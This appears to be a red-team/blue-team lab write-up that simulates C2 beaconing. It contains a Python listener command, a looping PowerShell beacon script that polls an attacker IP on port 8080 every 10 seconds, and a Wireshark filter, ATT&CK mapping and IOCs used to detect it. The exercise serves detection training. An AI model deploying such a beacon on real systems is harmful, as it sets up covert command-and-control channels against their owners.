# 🛡️ Scenario 4 – Beaconing Behavior (C2 Heartbeats)

## 🎯 Objective
Simulate beaconing behavior from a victim endpoint to an attacker-controlled server, and validate the Blue Team’s detection and monitoring capabilities using network traffic analysis. 

---

## 🔴 Red Team Activity

### Steps
1. **Host Listener on Attacker Machine**:
   - The attacker hosted a Python HTTP server on port **8080** to receive beacon requests:
     ```bash
     python3 -m http.server 8080
     ```
2. **Deploy Beacon Script on Victim Machine**:
   - A looping PowerShell script was executed on the victim machine:
     ```powershell
     while ($true) {
         Invoke-WebRequest -Uri http://192.168.2.131:8080/beacon -Method GET
         Start-Sleep -Seconds 10
     }
     ```

### Explanation
- The script forces the victim to send **periodic GET requests** to the attacker every 10 seconds.
- These automated requests simulate typical **C2 beaconing traffic** used by malware to maintain persistence and check in with a command server.

### Evidence (Text-Only, No Images)
- **Victim CLI**: PowerShell errors indicating repeated GET requests to `/beacon`.
- **Attacker Terminal**: Python server logs showing inbound GET requests from the victim.

---

## 🔵 Blue Team Detection

### Network Traffic Analysis (Wireshark Capture)
- **Filter Applied**: 
  ```wireshark
  http.request.uri contains "beacon" and tcp.port == 8080
  ```
- **Observed Traffic**:
  ```
  GET /beacon HTTP/1.1
  Host: 192.168.2.131:8080
  ```
- **Analysis**: Confirmed that the victim generated **regular, timed requests** (every 10s) to the attacker-controlled server. The lack of payload variation indicated automated activity rather than user-driven browsing.

### Evidence (Text-Only, No Images)
- Wireshark log snippet showing multiple `/beacon` GET requests at consistent intervals.

---

## 🧩 MITRE ATT&CK Mapping

- **Technique**: T1071.001 – Application Layer Protocol: Web Protocols  
  **Description**: Adversaries use web traffic (HTTP/S) for C2 communications.  
- **Technique**: T1571 – Non-Standard Port  
  **Description**: Use of HTTP over port 8080 instead of standard ports (80/443) to evade detection.  

---

## 📌 Indicators of Compromise (IOCs)

| Type         | Value                     | Notes                                              |
|--------------|---------------------------|----------------------------------------------------|
| Attacker IP  | 192.168.2.131            | Kali machine hosting HTTP listener                 |
| Victim IP    | 192.168.2.129            | Windows endpoint sending beacon traffic            |
| Beacon Path  | /beacon                  | Periodic GET request URI                          |
| Interval     | 10 seconds               | Fixed heartbeat interval                          |

---

## ✅ Summary
In this scenario, the attacker simulated **C2 beaconing** by using a PowerShell loop to send periodic GET requests to a Kali-controlled server. The Blue Team successfully detected the activity through:
- Wireshark, which showed **regular beaconing traffic** to `/beacon` on TCP port 8080.
- Recognition of **non-standard port usage** and **predictable traffic intervals**.

This exercise demonstrates the importance of detecting beaconing behavior as an early indicator of compromise. Regular heartbeat-like traffic, especially on uncommon ports, is a key sign of malware C2 communication.
